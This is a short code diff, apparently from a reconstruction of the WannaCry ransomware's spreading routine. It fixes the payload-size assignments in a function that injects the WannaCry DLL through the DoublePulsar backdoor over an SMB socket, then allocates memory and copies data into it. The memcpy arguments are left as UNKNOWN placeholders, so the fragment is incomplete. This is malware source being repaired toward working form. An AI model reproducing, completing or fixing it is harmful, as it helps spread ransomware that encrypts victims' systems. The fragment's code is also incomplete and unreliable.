@@ -137,13 +137,13 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 	{
 		//32 bits
 		//decimal: 4869
-		payload_size == 0x1305;
+		payload_size = 0x1305;
 	}
 	else
 	{
 		//64 bits
 		//decimal: 6144;
-		payload_size == 0x1800;
+		payload_size = 0x1800;
 	}
 	HGLOBAL hMem = GlobalAlloc(GMEM_ZEROINIT, payload_size + 12 + v8);
 	memcpy(hMem + payload_size, UNKNOWN, UNKNOWN);
